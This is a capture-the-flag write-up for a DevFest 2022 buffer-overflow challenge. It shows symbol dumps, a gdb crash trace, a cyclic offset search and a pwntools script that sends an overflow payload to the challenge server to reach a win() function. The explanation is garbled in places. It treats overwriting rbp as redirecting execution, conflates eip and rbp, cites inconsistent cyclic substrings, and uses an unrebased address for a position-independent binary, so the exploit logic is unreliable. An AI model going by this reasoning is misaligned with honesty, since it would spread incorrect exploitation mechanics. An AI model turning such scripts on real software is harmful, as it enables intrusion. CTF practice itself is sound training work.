# My First Overflow

## Write-Up

### Introduction

Whe analysing the code, you can find the following functions use : 

 - `fflush(stdout)` : flush a stream. For output streams, fflush() forces a write of all user-space buffered data for the given output or update stream via the stream's underlying write function.

This functions helps when data is in the buffers program to flush it to output streams like terminal. This is useful when using `netcat` and will block until an interaction happens from the user, it will directly flush out buffers data without that interaction or making user wait indifinatly.

 - `gets()` : get a string from standard input (DEPRECATED).

We can find in the BUGS section that it is deprecated and not used, since it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use.  It has been used to break computer security.  Use fgets() instead.

 - `main()` : the main function that, using `gets()` function reads a string from the input and put it in a buffer

 - `win()` : function that prints out the flag

In order to get the flag, you can cause a buffer overflow by entering a big amount of characters to overwrite pointers program. But this time, we need to be precise on the address to overwrite and with what overwrtiting with, since there is no handler for segmentation fault.

### Tools used

 - `gdb`
 - `gef` : pritifying of `gdb`, see : https://github.com/hugsy/gef 
 - `nm` : extract addresses of functions inside a binary
 - `cyclic` : gives a bytes cycle sequence to overwrite pointers and variables with.
 - `pwn tools` : binary exploitation tools library of python

### Explanation of the attack :

When seeing the code, we can that the vuln functions reads a buffer, and then normally get back to the main function to continue the executiion. Our goal here is to try to overwrite pointers and variables but to make the program jump to the `win()` function so we can print out the flag, and that by causing a **segmentation fault**.

To do that we can try to access a part of the memory that we dont have the right to like pointers of the stack ..., and we can use gets and its vulnerability to do that.

First, we need to get the following informations :

 - **Adresse of the win() function in the binary** : which is static in this case, we can do that using the `nm` command : 

```
nm ./challenge/my-first-overflow 
```

Here is the result

```
000000000000037c r __abi_tag
0000000000004048 B __bss_start
0000000000004088 b completed.0
                 w __cxa_finalize@GLIBC_2.2.5
0000000000004038 D __data_start
0000000000004038 W data_start
00000000000010e0 t deregister_tm_clones
00000000000011b6 T disable_buffering
0000000000001150 t __do_global_dtors_aux
0000000000003dd8 d __do_global_dtors_aux_fini_array_entry
0000000000004040 D __dso_handle
0000000000003de0 d _DYNAMIC
0000000000004048 D _edata
0000000000004090 B _end
                 U exit@GLIBC_2.2.5
000000000000125c T _fini
0000000000001190 t frame_dummy
0000000000003dd0 d __frame_dummy_init_array_entry
00000000000021b4 r __FRAME_END__
                 U gets@GLIBC_2.2.5
0000000000003fe8 d _GLOBAL_OFFSET_TABLE_
                 w __gmon_start__
0000000000002094 r __GNU_EH_FRAME_HDR
0000000000001000 T _init
0000000000002000 R _IO_stdin_used
                 w _ITM_deregisterTMCloneTable
                 w _ITM_registerTMCloneTable
                 U __libc_start_main@GLIBC_2.34
00000000000011f9 T main
                 U printf@GLIBC_2.2.5
                 U puts@GLIBC_2.2.5
0000000000001110 t register_tm_clones
                 U setbuf@GLIBC_2.2.5
                 U signal@GLIBC_2.2.5
00000000000010b0 T _start
0000000000004080 B stderr@GLIBC_2.2.5
0000000000004070 B stdin@GLIBC_2.2.5
0000000000004060 B stdout@GLIBC_2.2.5
                 U system@GLIBC_2.2.5
0000000000004048 D __TMC_END__
0000000000001199 T win
```

More precisely : 

```
...
0000000000004048 D __TMC_END__
0000000000001199 T win
```
This address will help us specify to the `rbp` pointer where to jumb back (contexte restetution) after finishing with the `main` function.

**Note :** rbp is the frame pointer on x86_64. In your generated code, it gets a snapshot of the stack pointer (rsp) so that when adjustments are made to rsp (i.e. reserving space for local variables or pushing values on to the stack), local variables and function parameters are still accessible from a constant offset from rbp. 

 - **Number of characters needed to overwrite pointers:** Next thing to do is to get the number of characters needed to overwrite the `rbp` pointer, to do that we will use `gdb` and `cyclyc` tools :

Fist, generate and random length string using `cyclic 200`. Note that the given lengh is bigger then the read buffer size

```
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```

After that, we run the `my-first-overflow` binary in `gdb` and give it our generated string. Notice in the `rbp` pointer the string part specified as nesxt instruction address : 

```
gef➤  r
Starting program: /home/rivench/Documents/CTFs/devfest_Cybersecurity_2k22/my_first_pwn/challenge/my-first-overflow 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc6000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
My buffer can only hold 32 characters, I really wonder what would happen if you sent more than that...
Enter your input: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
0x0000555555555259 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x007ffff7df4a80  →  0x00000000fbad208b
$rdx   : 0x1               
$rsp   : 0x007fffffffdce8  →  "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
$rsi   : 0x1               
$rdi   : 0x007ffff7df6a60  →  0x0000000000000000
$rip   : 0x00555555555259  →  <main+96> ret 
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x007ffff7c09c68  →  0x000e0022000043b3
$r11   : 0x246             
$r12   : 0x007fffffffddf8  →  0x007fffffffe144  →  "/home/rivench/Documents/CTFs/devfest_Cybersecurity[...]"
$r13   : 0x005555555551f9  →  <main+0> push rbp
$r14   : 0x00555555557dd8  →  0x00555555555150  →  <__do_global_dtors_aux+0> endbr64 
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2c0  →  0x00555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffdce8│+0x0000: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"      ← $rsp
0x007fffffffdcf0│+0x0008: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
0x007fffffffdcf8│+0x0010: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabba[...]"
0x007fffffffdd00│+0x0018: "qaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabda[...]"
0x007fffffffdd08│+0x0020: "saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfa[...]"
0x007fffffffdd10│+0x0028: "uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabha[...]"
0x007fffffffdd18│+0x0030: "waaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabja[...]"
0x007fffffffdd20│+0x0038: "yaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaabla[...]"
──────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55555555524e <main+85>        call   0x555555555080 <gets@plt>
   0x555555555253 <main+90>        mov    eax, 0x0
   0x555555555258 <main+95>        leave  
 → 0x555555555259 <main+96>        ret    
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "my-first-overfl", stopped 0x555555555259 in main (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555259 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```
we can see that it took "laaa" as the address where to go to for contexte restitution. To get the characters needed to overwrite the `eip` pointer then we needed to give `cyclic` command the sustring that the pointer was overwritend with :

```
cyclic -l iaaa
```

Here is the result

```
32
```

So we need to generate 32 characters to arrive to the `rbp` pointer, then give it the address we want so it jumbs to it after finishing with the vuln function.

```
cyclic 32
```

```
aaaabaaacaaadaaaeaaafaaagaaahaaa
```

**Note :** Note that in the source code we have : `My buffer can only hold 32 characters, I really wonder what would happen if you sent more than that...`, so we could easily guess that the cyclic value is 32

Now that we have th information we needed, we can create our script that exploit the vulnerability in the source code. we will be using `pwn` tools for that : 

 - First, get the byte version of the address found of the `win()` function :

```python
Python 3.10.8 (main, Oct 24 2022, 10:07:16) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> p64(0x0000000000001199)
b'\x99\x11\x00\x00\x00\x00\x00\x00'
>>> exit
Use exit() or Ctrl-D (i.e. EOF) to exit
>>> exit()
```

 - After that, using connection tools, send the character sequence generated followed by the address we want to overwrite the `eip` pointer with. We can create a python script for that : 

```python
#! /usr/bin/python3
from pwn import *

HOST = 'devfest22-cybersec.gdgalgiers.com'
PORT = 1400

p = remote(HOST, PORT)

p.sendlineafter(b'Enter your input: ', b'aaaabaaacaaadaaaeaaafaaagaaahaaa\x99\x11\x00\x00\x00\x00\x00\x00')
p.interactive()
```

After executing that code, first, the pointers will be overwrited of the `my-first-overflow` program but we will find that the `rbp` pointer will be overwrittend with our specific address, this will make him jump to the `win()` instead of returning to the main function, and after execution prints out the flag.



## Flag

DevFest22{BuffER_overfL0Ws_4rE_CO00L}